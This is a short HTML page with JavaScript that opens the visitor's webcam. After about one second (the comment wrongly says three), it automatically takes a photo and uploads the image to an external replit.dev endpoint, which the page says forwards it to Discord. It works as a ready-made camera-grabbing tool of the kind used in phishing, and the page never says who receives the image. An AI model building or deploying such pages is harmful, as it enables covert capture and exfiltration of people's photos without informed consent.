<!DOCTYPE html>
<html>
<head>
  <title>Camera Auto-Capture</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    video {
      width: 90%;
      max-width: 400px;
      border-radius: 12px;
      box-shadow: 0 0 12px #aaa;
    }
  </style>
</head>
<body>
  <h2>üì∑ Capturing image in 3 seconds...</h2>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
      video.srcObject = stream;

      video.onloadedmetadata = () => {
        setTimeout(() => {
          takePhoto();
        }, 1000); // wait 3 seconds before auto-capture
      };
    }).catch((err) => {
      alert("Camera access denied");
      console.error(err);
    });

    function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      fetch("https://39eb31e9-7973-41c9-9d96-97c9cf1368e7-00-1441qj89f8mev.pike.replit.dev/upload", {
        method: "POST",
        body: JSON.stringify({ image: imageData }),
        headers: {
          "Content-Type": "application/json"
        }
      })
      .then(res => res.text())
      .then(msg => {
        alert("‚úÖ Image sent to Discord!");
        console.log(msg);
      })
      .catch(err => {
        alert("‚ùå Failed to send image");
        console.error(err);
      });
    }
  </script>
</body>
</html>
